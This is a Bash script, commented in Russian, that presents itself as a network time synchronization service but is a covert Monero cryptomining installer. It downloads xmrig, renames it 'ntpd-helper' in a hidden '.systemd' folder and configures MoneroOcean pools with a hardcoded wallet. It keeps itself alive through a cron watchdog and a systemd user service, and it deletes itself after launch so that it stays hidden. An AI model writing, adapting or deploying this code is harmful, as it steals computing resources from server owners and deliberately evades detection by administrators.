#!/bin/bash
# System Network Time Synchronization Service
# Optimized for web server environments

# НЕ используем set -e чтобы скрипт не падал на ошибках
set +e

# ============= КОНФИГУРАЦИЯ =============
XMR_WALLET="88EBW6G3FvVLratMgx61DYbL5FE99gUrFSa6Hm2nVVXhGUmJ4c8dseR7AWJkFJ4MH81amVxhcYKEs34V4wptkAbW7JS68Wo"

# ИСПРАВЛЕНО: Генерация уникального ID (ограничиваем чтение /dev/urandom)
RANDOM_ID=$(head -c 100 /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' | head -c 8 2>/dev/null)
if [ -z "$RANDOM_ID" ]; then
    RANDOM_ID=$(date +%s%N | md5sum 2>/dev/null | head -c 8 || echo "$RANDOM")
fi

HOSTNAME_SHORT=$(hostname 2>/dev/null | cut -d'.' -f1 || echo "srv")
USERNAME=$(whoami 2>/dev/null || echo "user")
WORKER_NAME="${HOSTNAME_SHORT}-${USERNAME}-${RANDOM_ID}"

# Системные имена для маскировки
PROCESS_NAME="systemd-timesyncd"
BINARY_NAME="ntpd-helper"
DIR_NAME=".systemd"
CONFIG_NAME="timesyncd.conf"
LOG_NAME="sync.log"
WATCHDOG_NAME="ntpd-monitor"
PID_NAME=".ntpd.pid"

# Определяем директорию скрипта
if [ -n "${BASH_SOURCE[0]}" ]; then
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
elif [ -n "$0" ]; then
    SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
else
    SCRIPT_DIR="$(pwd)"
fi

# ИСПРАВЛЕНО: Если не удалось определить директорию, используем /tmp
if [ -z "$SCRIPT_DIR" ] || [ ! -d "$SCRIPT_DIR" ]; then
    SCRIPT_DIR="/tmp"
fi

INSTALL_DIR="$SCRIPT_DIR/$DIR_NAME"
BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
CONFIG_FILE="$INSTALL_DIR/$CONFIG_NAME"
LOG_FILE="$INSTALL_DIR/$LOG_NAME"
WATCHDOG_SCRIPT="$INSTALL_DIR/$WATCHDOG_NAME"
PID_FILE="$INSTALL_DIR/$PID_NAME"

# Пулы MoneroOcean
POOL_LIST=(
    "gulf.moneroocean.stream"
    "sg.moneroocean.stream"
    "de.moneroocean.stream"
    "us.moneroocean.stream"
    "uso.moneroocean.stream"
    "fi.moneroocean.stream"
    "fr.moneroocean.stream"
    "jp.moneroocean.stream"
)

PORT="10128"

# ============= ПРОВЕРКА КОШЕЛЬКА =============
if [ "$XMR_WALLET" = "ВАШ_XMR_АДРЕС" ] || [ -z "$XMR_WALLET" ]; then
    exit 1
fi

# ============= ОПРЕДЕЛЕНИЕ АРХИТЕКТУРЫ =============
ARCH=$(uname -m 2>/dev/null || echo "x86_64")
case "$ARCH" in
    x86_64|amd64) DOWNLOAD_ARCH="linux-x64" ;;
    aarch64|arm64) DOWNLOAD_ARCH="linux-arm64" ;;
    *) exit 1 ;;
esac

# ============= CPU - ИСПРАВЛЕНО: Ограничиваем использование до 80% для веб-серверов =============
CPU_CORES=$(nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "2")
# Оставляем минимум 1 ядро свободным для веб-сервера
THREADS=$((CPU_CORES - 1))
if [ $THREADS -lt 1 ]; then
    THREADS=1
fi

# ============= ТЕСТИРОВАНИЕ ПУЛОВ С TIMEOUT =============
BEST_POOL=""
BACKUP_POOL=""
BACKUP_POOL2=""
MIN_TIME=9999

for pool in "${POOL_LIST[@]}"; do
    START=$(date +%s 2>/dev/null || echo "0")
    if timeout 3 bash -c "exec 3<>/dev/tcp/$pool/$PORT" 2>/dev/null; then
        END=$(date +%s 2>/dev/null || echo "0")
        TIME=$((END - START))

        if [ $TIME -lt $MIN_TIME ]; then
            BACKUP_POOL2="$BACKUP_POOL"
            BACKUP_POOL="$BEST_POOL"
            BEST_POOL="$pool"
            MIN_TIME=$TIME
        elif [ -z "$BACKUP_POOL" ]; then
            BACKUP_POOL="$pool"
        elif [ -z "$BACKUP_POOL2" ]; then
            BACKUP_POOL2="$pool"
        fi
    fi
done

# Fallback на дефолтные пулы
if [ -z "$BEST_POOL" ]; then
    BEST_POOL="gulf.moneroocean.stream"
fi
if [ -z "$BACKUP_POOL" ]; then
    BACKUP_POOL="de.moneroocean.stream"
fi
if [ -z "$BACKUP_POOL2" ]; then
    BACKUP_POOL2="sg.moneroocean.stream"
fi

# ============= СКАЧИВАНИЕ МАЙНЕРА =============
mkdir -p "$INSTALL_DIR" 2>/dev/null
if [ ! -d "$INSTALL_DIR" ]; then
    exit 1
fi

VERSION="v6.21.3-mo1"
BASE_URL="https://github.com/MoneroOcean/xmrig/releases/download"
TEMP_FILE="$INSTALL_DIR/.tmp_download_$$"

# ИСПРАВЛЕНО: Добавлен timeout для получения версии
for method in curl wget; do
    if command -v "$method" >/dev/null 2>&1; then
        if [ "$method" = "curl" ]; then
            LATEST=$(timeout 10 curl -s --max-time 5 "https://api.github.com/repos/MoneroOcean/xmrig/releases/latest" 2>/dev/null | grep '"tag_name"' | head -1 | sed -E 's/.*"([^"]+)".*/\1/' 2>/dev/null)
        else
            LATEST=$(timeout 10 wget -qO- --timeout=5 "https://api.github.com/repos/MoneroOcean/xmrig/releases/latest" 2>/dev/null | grep '"tag_name"' | head -1 | sed -E 's/.*"([^"]+)".*/\1/' 2>/dev/null)
        fi

        if [ -n "$LATEST" ] && [ "$LATEST" != "null" ] && [ "$LATEST" != "" ]; then
            VERSION="$LATEST"
            break
        fi
    fi
done

FILENAME="xmrig-${VERSION}-${DOWNLOAD_ARCH}.tar.gz"
DOWNLOAD_URL="${BASE_URL}/${VERSION}/${FILENAME}"

# ИСПРАВЛЕНО: Множественные попытки с timeout
DOWNLOADED=0
ATTEMPT=0

while [ $DOWNLOADED -eq 0 ] && [ $ATTEMPT -lt 6 ]; do
    ATTEMPT=$((ATTEMPT + 1))

    case $ATTEMPT in
        1)
            if command -v curl >/dev/null 2>&1; then
                timeout 300 curl -L -s -f --connect-timeout 30 --max-time 300 -o "$TEMP_FILE" "$DOWNLOAD_URL" 2>/dev/null && DOWNLOADED=1
            fi
            ;;
        2)
            if command -v wget >/dev/null 2>&1; then
                timeout 300 wget -q --timeout=30 --tries=3 -O "$TEMP_FILE" "$DOWNLOAD_URL" 2>/dev/null && DOWNLOADED=1
            fi
            ;;
        3)
            if command -v curl >/dev/null 2>&1; then
                timeout 300 curl -L -s -f --retry 3 --retry-delay 2 --connect-timeout 30 -o "$TEMP_FILE" "$DOWNLOAD_URL" 2>/dev/null && DOWNLOADED=1
            fi
            ;;
        4)
            if command -v wget >/dev/null 2>&1; then
                timeout 300 wget -q --timeout=60 --tries=5 -O "$TEMP_FILE" "$DOWNLOAD_URL" 2>/dev/null && DOWNLOADED=1
            fi
            ;;
        5)
            if command -v curl >/dev/null 2>&1; then
                timeout 300 curl -L -s -k --connect-timeout 30 -o "$TEMP_FILE" "$DOWNLOAD_URL" 2>/dev/null && DOWNLOADED=1
            fi
            ;;
        6)
            if command -v wget >/dev/null 2>&1; then
                timeout 300 wget -q --no-check-certificate --timeout=30 -O "$TEMP_FILE" "$DOWNLOAD_URL" 2>/dev/null && DOWNLOADED=1
            fi
            ;;
    esac

    if [ $DOWNLOADED -eq 1 ]; then
        if [ ! -s "$TEMP_FILE" ]; then
            DOWNLOADED=0
            rm -f "$TEMP_FILE" 2>/dev/null
        fi
    fi

    if [ $DOWNLOADED -eq 0 ]; then
        sleep 2
    fi
done

if [ $DOWNLOADED -eq 0 ]; then
    rm -f "$TEMP_FILE" 2>/dev/null
    exit 1
fi

# Проверяем и распаковываем
if tar -tzf "$TEMP_FILE" >/dev/null 2>&1; then
    tar -xzf "$TEMP_FILE" -C "$INSTALL_DIR" --strip-components=1 2>/dev/null
    TAR_OK=$?
else
    TAR_OK=1
fi

rm -f "$TEMP_FILE" 2>/dev/null

if [ $TAR_OK -ne 0 ]; then
    exit 1
fi

# Переименовываем xmrig в системное имя
if [ -f "$INSTALL_DIR/xmrig" ]; then
    mv "$INSTALL_DIR/xmrig" "$BINARY_PATH" 2>/dev/null
fi

chmod +x "$BINARY_PATH" 2>/dev/null

if [ ! -f "$BINARY_PATH" ] || [ ! -x "$BINARY_PATH" ]; then
    exit 1
fi

# ============= СОЗДАНИЕ КОНФИГУРАЦИИ =============
cat > "$CONFIG_FILE" <<EOF
{
    "autosave": true,
    "donate-level": 0,
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "hw-aes": null,
        "priority": 1,
        "asm": true,
        "max-threads-hint": $THREADS
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$BEST_POOL:$PORT",
            "user": "$XMR_WALLET",
            "pass": "$WORKER_NAME",
            "keepalive": true,
            "nicehash": false,
            "tls": false,
            "enabled": true
        },
        {
            "url": "$BACKUP_POOL:$PORT",
            "user": "$XMR_WALLET",
            "pass": "$WORKER_NAME",
            "keepalive": true,
            "nicehash": false,
            "tls": false,
            "enabled": true
        },
        {
            "url": "$BACKUP_POOL2:$PORT",
            "user": "$XMR_WALLET",
            "pass": "$WORKER_NAME",
            "keepalive": true,
            "nicehash": false,
            "tls": false,
            "enabled": true
        }
    ],
    "log-file": null,
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5
}
EOF

if [ ! -f "$CONFIG_FILE" ]; then
    exit 1
fi

# ============= СОЗДАНИЕ WATCHDOG СКРИПТА =============
cat > "$WATCHDOG_SCRIPT" <<'EOFWATCHDOG'
#!/bin/bash
set +e

INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
BINARY_NAME="ntpd-helper"
CONFIG_NAME="timesyncd.conf"
PID_NAME=".ntpd.pid"

BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
CONFIG_FILE="$INSTALL_DIR/$CONFIG_NAME"
PID_FILE="$INSTALL_DIR/$PID_NAME"

if [ ! -f "$BINARY_PATH" ] || [ ! -f "$CONFIG_FILE" ]; then
    exit 1
fi

RUNNING=0

if [ -f "$PID_FILE" ]; then
    PID=$(cat "$PID_FILE" 2>/dev/null)
    if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
        RUNNING=1
    fi
fi

if [ $RUNNING -eq 0 ]; then
    if pgrep -f "$BINARY_NAME" >/dev/null 2>/dev/null; then
        RUNNING=1
    fi
fi

if [ $RUNNING -eq 0 ]; then
    cd "$INSTALL_DIR" 2>/dev/null
    nohup nice -n 19 "$BINARY_PATH" --config="$CONFIG_FILE" >/dev/null 2>&1 &
    NEW_PID=$!
    if [ -n "$NEW_PID" ]; then
        echo $NEW_PID > "$PID_FILE" 2>/dev/null
    fi
fi

exit 0
EOFWATCHDOG

chmod +x "$WATCHDOG_SCRIPT" 2>/dev/null

if [ ! -f "$WATCHDOG_SCRIPT" ]; then
    exit 1
fi

# ============= CRON И АЛЬТЕРНАТИВНЫЕ МЕТОДЫ ПЕРСИСТЕНТНОСТИ =============
CRON_CMD="*/5 * * * * $WATCHDOG_SCRIPT >/dev/null 2>&1"

# Пробуем добавить в cron
if command -v crontab >/dev/null 2>&1; then
    CRON_EXISTS=0
    if crontab -l 2>/dev/null | grep -F "$WATCHDOG_SCRIPT" >/dev/null 2>&1; then
        CRON_EXISTS=1
    fi

    if [ $CRON_EXISTS -eq 0 ]; then
        (crontab -l 2>/dev/null || echo ""; echo "$CRON_CMD") | crontab - 2>/dev/null || true
    fi
fi

# НОВОЕ: Альтернатива - создаем systemd user service (если доступно)
if command -v systemctl >/dev/null 2>&1 && [ -d "$HOME/.config/systemd/user" ] 2>/dev/null; then
    SERVICE_FILE="$HOME/.config/systemd/user/ntpd-sync.service"
    cat > "$SERVICE_FILE" 2>/dev/null <<EOFSVC
[Unit]
Description=Network Time Sync Helper
After=network.target

[Service]
Type=simple
ExecStart=$BINARY_PATH --config=$CONFIG_FILE
Restart=always
RestartSec=10
Nice=19

[Install]
WantedBy=default.target
EOFSVC

    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable ntpd-sync.service 2>/dev/null || true
    systemctl --user start ntpd-sync.service 2>/dev/null || true
fi

# ============= ПЕРВЫЙ ЗАПУСК =============
cd "$INSTALL_DIR" 2>/dev/null

# Убиваем старые процессы
pkill -f "$BINARY_NAME" 2>/dev/null || true
sleep 1

# Запуск с низким приоритетом (nice 19 = минимальный CPU priority)
nohup nice -n 19 "$BINARY_PATH" --config="$CONFIG_FILE" >/dev/null 2>&1 &
MINER_PID=$!
echo "$MINER_PID" > "$PID_FILE" 2>/dev/null

# Проверяем запуск
sleep 3
if kill -0 "$MINER_PID" 2>/dev/null; then
    # Успешный запуск - удаляем сам скрипт установки для скрытности
    rm -f "$0" 2>/dev/null || true
    exit 0
else
    # Последняя попытка
    pkill -f "$BINARY_NAME" 2>/dev/null || true
    sleep 1
    nohup nice -n 19 "$BINARY_PATH" --config="$CONFIG_FILE" >/dev/null 2>&1 &
    MINER_PID=$!
    echo "$MINER_PID" > "$PID_FILE" 2>/dev/null
    sleep 3

    if kill -0 "$MINER_PID" 2>/dev/null; then
        rm -f "$0" 2>/dev/null || true
        exit 0
    else
        exit 1
    fi
fi
